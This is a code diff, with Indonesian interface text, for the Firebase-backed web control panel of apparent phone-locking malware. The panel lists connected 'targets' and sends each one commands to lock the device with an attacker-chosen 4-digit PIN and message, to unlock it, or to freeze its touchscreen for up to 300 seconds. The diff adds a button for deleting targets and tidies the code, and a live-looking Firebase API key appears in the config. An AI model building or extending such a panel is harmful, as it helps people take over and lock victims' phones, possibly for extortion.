@@ -47,11 +47,11 @@
             padding: 10px;
             border-radius: 8px;
             margin: 10px 0;
-            max-height: 120px;
+            max-height: 200px;
             overflow-y: auto;
         }
         .target-item {
-            padding: 8px 12px;
+            padding: 8px 10px;
             margin: 4px 0;
             background: #000;
             border-radius: 5px;
@@ -60,14 +60,30 @@
             justify-content: space-between;
             align-items: center;
             cursor: pointer;
+            gap: 5px;
         }
         .target-item.active { border-left-color: #ffaa00; background: #1a1a00; }
+        .target-item .info { flex: 1; min-width: 0; }
         .target-item .name { font-size: 13px; }
         .target-item .id { font-size: 10px; color: #666; }
         .target-item .status { font-size: 10px; }
         .target-item .locked { color: #ff0044; }
         .target-item .unlocked { color: #00ff41; }
         .target-item .touchblock { color: #ffaa00; }
+        .target-item .btn-delete {
+            background: #ff0044;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            padding: 4px 10px;
+            font-size: 11px;
+            cursor: pointer;
+            font-weight: bold;
+            flex-shrink: 0;
+        }
+        .target-item .btn-delete:hover {
+            background: #cc0033;
+        }
         
         .section {
             background: #1a1a1a;
@@ -196,6 +212,7 @@
         .log .info { color: #ffaa00; }
         .log .action { color: #00ccff; }
         .log .touch { color: #ffaa00; }
+        .log .delete { color: #ff0044; }
         
         .info-box {
             background: #1a1a1a;
@@ -211,6 +228,7 @@
             .container { padding: 12px; }
             .pin-dot { width: 32px; height: 42px; font-size: 18px; line-height: 38px; }
             .btn { padding: 12px; font-size: 11px; min-width: 60px; }
+            .target-item .btn-delete { padding: 2px 8px; font-size: 10px; }
         }
     </style>
 </head>
@@ -232,6 +250,7 @@
             <span>Status:</span> <span id="deviceStatus">-</span>
         </div>
 
+        <!-- SECTION 1: LOCK DEVICE -->
         <div class="section">
             <div class="section-title"><span class="icon">🔒</span> LOCK DEVICE</div>
             <div class="pin-dots">
@@ -250,6 +269,7 @@
             </div>
         </div>
 
+        <!-- SECTION 2: TOUCH BLOCK -->
         <div class="section" style="border-color:#ffaa00;">
             <div class="section-title" style="color:#ffaa00;"><span class="icon">✋</span> TOUCH BLOCK (FREEZE HP)</div>
             <div class="touch-duration">
@@ -274,7 +294,7 @@
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
     <script>
         // ============================================================
-        // 🔥 DATA FIREBASE ANDA - SUDAH FIX
+        // 🔥 FIREBASE CONFIG
         // ============================================================
         const firebaseConfig = {
             apiKey: "AIzaSyD4wbgxY6e6m0vHPOZykPuQdea8LdFkQsk",
@@ -315,48 +335,56 @@
             return parseInt(document.getElementById('touchDuration').value) || 10;
         }
 
-        function addLog(text, type) {
-            type = type || 'info';
-            var div = document.createElement('div');
+        function addLog(text, type = 'info') {
+            const div = document.createElement('div');
             div.className = type;
-            var d = new Date();
-            var time = d.getHours() + ':' + String(d.getMinutes()).padStart(2,'0') + ':' + String(d.getSeconds()).padStart(2,'0');
+            const d = new Date();
+            const time = String(d.getHours()).padStart(2,'0') + ':' + String(d.getMinutes()).padStart(2,'0') + ':' + String(d.getSeconds()).padStart(2,'0');
             div.textContent = '[' + time + '] ' + text;
             logArea.appendChild(div);
             logArea.scrollTop = logArea.scrollHeight;
-            if (logArea.children.length > 25) {
+            if (logArea.children.length > 30) {
                 logArea.removeChild(logArea.firstChild);
             }
         }
 
+        // ============ LISTEN TARGETS ============
         db.ref('targets').on('value', function(snapshot) {
-            var data = snapshot.val();
+            const data = snapshot.val();
             targets = data || {};
             renderTargetList();
             
             if (!selectedTarget && Object.keys(targets).length > 0) {
-                var firstId = Object.keys(targets)[0];
+                const firstId = Object.keys(targets)[0];
                 selectTarget(firstId);
             }
             
             if (selectedTarget && targets[selectedTarget]) {
                 updateInfo(selectedTarget);
+            } else if (selectedTarget && !targets[selectedTarget]) {
+                // Target yang dipilih sudah dihapus
+                selectedTarget = null;
+                updateInfo(null);
             }
         });
 
+        // ============ RENDER TARGET LIST ============
         function renderTargetList() {
-            var keys = Object.keys(targets);
+            const keys = Object.keys(targets);
             if (keys.length === 0) {
-                targetList.innerHTML = '<div style="text-align:center; color:#666; padding:10px; font-size:12px;">⚠️ Tidak ada target terhubung</div>';
+                targetList.innerHTML = `
+                    <div style="text-align:center; color:#666; padding:10px; font-size:12px;">
+                        ⚠️ Tidak ada target terhubung
+                    </div>
+                `;
                 return;
             }
 
             targetList.innerHTML = '';
             keys.forEach(function(id) {
-                var t = targets[id];
-                var div = document.createElement('div');
-                var statusText = '🔓 UNLOCKED';
-                var statusClass = 'unlocked';
+                const t = targets[id];
+                let statusText = '🔓 UNLOCKED';
+                let statusClass = 'unlocked';
                 if (t.touchBlocked) {
                     statusText = '✋ FREEZE';
                     statusClass = 'touchblock';
@@ -364,13 +392,50 @@
                     statusText = '🔒 LOCKED';
                     statusClass = 'locked';
                 }
+                
+                const div = document.createElement('div');
                 div.className = 'target-item' + (selectedTarget === id ? ' active' : '');
-                div.innerHTML = '<div><div class="name">' + (t.deviceName || 'Unknown') + '</div><div class="id">' + id.slice(0,8) + '</div></div><div style="text-align:right;"><div class="status ' + statusClass + '">' + statusText + '</div><div style="font-size:9px; color:#666;">' + (t.online ? '🟢 Online' : '🔴 Offline') + '</div></div>';
-                div.onclick = function() { selectTarget(id); };
+                div.innerHTML = `
+                    <div class="info" data-id="${id}">
+                        <div class="name">${t.deviceName || 'Unknown'}</div>
+                        <div class="id">${id.slice(0,8)}</div>
+                        <div class="status ${statusClass}">${statusText}</div>
+                    </div>
+                    <button class="btn-delete" data-id="${id}">✕ HAPUS</button>
+                `;
+                
+                // Klik pada info = pilih target
+                div.querySelector('.info').onclick = function() {
+                    selectTarget(id);
+                };
+                
+                // Klik tombol hapus
+                div.querySelector('.btn-delete').onclick = function(e) {
+                    e.stopPropagation();
+                    deleteTarget(id);
+                };
+                
                 targetList.appendChild(div);
             });
         }
 
+        // ============ DELETE TARGET ============
+        function deleteTarget(id) {
+            const name = targets[id] ? targets[id].deviceName || id.slice(0,8) : id.slice(0,8);
+            if (confirm('⚠️ Hapus target "' + name + '"?')) {
+                db.ref('targets/' + id).remove().then(function() {
+                    addLog('🗑️ TARGET DIHAPUS: ' + name, 'delete');
+                    if (selectedTarget === id) {
+                        selectedTarget = null;
+                        updateInfo(null);
+                    }
+                }).catch(function(err) {
+                    addLog('Gagal hapus: ' + err.message, 'error');
+                });
+            }
+        }
+
+        // ============ SELECT TARGET ============
         function selectTarget(id) {
             selectedTarget = id;
             renderTargetList();
@@ -384,8 +449,9 @@
             }
         }
 
+        // ============ UPDATE INFO ============
         function updateInfo(id) {
-            var t = targets[id];
+            const t = targets[id];
             if (!t) {
                 deviceName.textContent = '-';
                 deviceStatus.textContent = '-';
@@ -395,7 +461,7 @@
                 return;
             }
             deviceName.textContent = t.deviceName || 'Unknown';
-            var status = '🔓 UNLOCKED';
+            let status = '🔓 UNLOCKED';
             if (t.touchBlocked) {
                 status = '✋ FREEZE';
             } else if (t.locked) {
@@ -407,21 +473,22 @@
             touchBlockBtn.disabled = false;
         }
 
+        // ============ LOCK ============
         document.getElementById('lockBtn').onclick = function() {
             if (!selectedTarget || !targets[selectedTarget]) {
                 addLog('Pilih target terlebih dahulu!', 'error');
                 return;
             }
 
-            var pin = getPin();
-            var message = getMessage();
+            const pin = getPin();
+            const message = getMessage();
 
             if (pin.length !== 4 || !/^\d{4}$/.test(pin)) {
                 addLog('PIN harus 4 digit angka!', 'error');
                 return;
             }
 
-            var ref = db.ref('targets/' + selectedTarget);
+            const ref = db.ref('targets/' + selectedTarget);
             ref.update({
                 locked: true,
                 pin: pin,
@@ -435,13 +502,14 @@
             });
         };
 
+        // ============ UNLOCK ============
         document.getElementById('unlockBtn').onclick = function() {
             if (!selectedTarget || !targets[selectedTarget]) {
                 addLog('Pilih target terlebih dahulu!', 'error');
                 return;
             }
 
-            var ref = db.ref('targets/' + selectedTarget);
+            const ref = db.ref('targets/' + selectedTarget);
             ref.update({
                 locked: false,
                 pin: null,
@@ -454,19 +522,20 @@
             });
         };
 
+        // ============ TOUCH BLOCK ============
         document.getElementById('touchBlockBtn').onclick = function() {
             if (!selectedTarget || !targets[selectedTarget]) {
                 addLog('Pilih target terlebih dahulu!', 'error');
                 return;
             }
 
-            var duration = getTouchDuration();
+            const duration = getTouchDuration();
             if (duration < 1 || duration > 300) {
                 addLog('Durasi harus 1-300 detik!', 'error');
                 return;
             }
 
-            var ref = db.ref('targets/' + selectedTarget);
+            const ref = db.ref('targets/' + selectedTarget);
             ref.update({
                 touchBlocked: true,
                 touchDuration: duration,
